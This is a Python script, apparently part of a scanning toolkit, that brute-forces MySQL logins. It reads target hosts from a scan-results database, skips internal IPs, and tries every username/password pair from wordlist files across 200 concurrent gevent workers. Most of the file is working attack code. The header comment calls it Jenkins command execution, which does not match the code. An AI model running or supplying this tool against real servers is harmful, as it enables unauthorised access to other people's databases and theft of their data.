# coding:utf-8
"""
	jenkins 命令执行
"""

from gevent import monkey
from gevent.pool import Pool
from lib.lib import *
import time
import traceback
import MySQLdb
monkey.patch_all()
logpath = "temp/mysqlbrute_"+time.strftime("%Y-%m-%d_%H:%M", time.localtime(time.time()))

def check(task):
	ip = task[0]
	port = int(task[1])
	user = task[2]
	passwd = task[3]
	# 忽略内网ip扫描
	if is_internal_ip(ip):
		return

	try:
		MySQLdb.connect(host=ip,port=port,user=user,passwd=passwd)
		print("lucky")
	except Exception as e:
		#print(traceback.print_exc())
		print(e)
		#print(url)
		pass
"""
	检查结束后
"""
def clean():
	pass
"""
	测试
	test("127.0.0.1","3306","fscan","fscan123")
"""
def test(ip, port,user,passwd):
	check((ip, port, user, passwd))


def main():
	res = get_from_database(
		"select address,port from blog.scan_scan_port where service like '%mysql%' or port='3306'")
	res = list(set(res))
	records = []
	print("共检查{0}个IP".format(len(res)))
	for (ip,port) in res:
		for user in open("res/mysql_user.txt","r").readlines():
			for passwd in open("res/mysql_passwd.txt","r").readlines():
				records.insert(0,(ip,port,user.strip(),passwd.strip()))
	random.shuffle(records)
	p = Pool(200)
	p.map(check, records)
if __name__ == "__main__":
	print("String...")
	main()
	print("Finished...")
	clean()
